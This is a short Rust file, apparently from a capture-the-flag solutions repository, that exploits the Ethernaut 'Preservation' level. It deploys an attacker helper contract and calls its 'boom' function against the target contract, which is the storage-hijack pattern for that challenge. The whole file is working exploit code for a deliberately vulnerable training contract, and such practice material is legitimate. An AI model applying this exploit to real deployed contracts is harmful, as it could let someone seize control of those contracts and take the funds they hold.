use crate::abi::i_am_true_library_contract_please_believe_me::IAmTrueLibraryContractPleaseBelieveMe;
use async_trait::async_trait;
use ctf::ethernaut::lvl16_preservation::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Preservation::new(target.address, offender.clone());
        let hack_contract = IAmTrueLibraryContractPleaseBelieveMe::deploy(
            offender.to_owned(),
            (),
        )?
        .send()
        .await?;
        hack_contract
            .boom(contract.address(), offender.address())
            .send()
            .await?;
        Ok(())
    }
}
